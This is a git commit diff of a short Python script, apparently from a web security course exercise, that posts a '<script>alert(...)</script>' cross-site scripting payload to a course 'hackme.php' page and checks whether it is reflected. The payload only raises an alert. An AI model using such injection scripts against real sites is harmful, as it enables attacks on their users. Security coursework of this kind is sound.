474c41b9ba1b2c8cc313957a47645e115b572f70
miro5460 <robin411989@gmail.com>
2018-12-11 11:18:50 -0500

    updated fuzzer to have successfull XSS on target

--- Fuzzer/fuzzer.py
+++ Fuzzer/fuzzer.py
@@ -7,8 +7,7 @@ from pprint import pprint
 
 URL = "http://www.cs.tufts.edu/comp/20/hackme.php"
 
-payload = {'fullname': 'IMG SRC=JaVaScRiPt:alert("XSS")>', 'beverage': 'Water'}
-#<script>alert("111111111111111");</script
+payload = {'fullname': '<script>alert("XSS attack")</script>', 'beverage': 'Water'}
 aRequest = requests.post(URL, payload)
 pprint(aRequest.content)
 textRequest = str(aRequest.content)
@@ -17,4 +16,5 @@ if '<script>' in textRequest:
     print("success")
 else:
     print("NO success")
+
 
